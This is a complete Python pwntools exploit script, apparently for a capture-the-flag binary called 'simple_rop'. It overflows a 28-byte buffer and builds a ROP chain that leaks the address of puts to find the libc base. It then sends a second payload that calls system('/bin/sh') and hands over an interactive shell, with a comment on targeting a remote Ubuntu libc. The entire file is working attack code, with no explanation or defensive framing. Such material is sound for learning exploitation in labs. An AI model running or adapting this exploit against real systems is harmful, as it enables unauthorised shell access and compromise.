from pwn import *

elf = ELF("simple_rop")
p = elf.process()
libc = elf.libc # for remote, use ELF("libc6_2.31-0ubuntu9_i386.so")
ropExec = ROP(elf)

buffOffset = 28

# Find libc address -> puts real address - puts relative address
ropExec.call(elf.symbols["puts"], [elf.got["puts"]])  # Find real puts address
ropExec.call(elf.symbols["main"])                     # Return to main after sending first payload

payload = b"a" * buffOffset + ropExec.chain()

p.recvline()
p.sendline(payload)

putsAddress = u32(p.recvline()[:4])
libc.address = putsAddress - libc.symbols["puts"]

# Execute system
ropLib = ROP(libc)
ropLib.system(next(libc.search(b"/bin/sh")))
ropLib.exit()

payload = b"a" * buffOffset + ropLib.chain()

p.sendline(payload)

p.interactive()
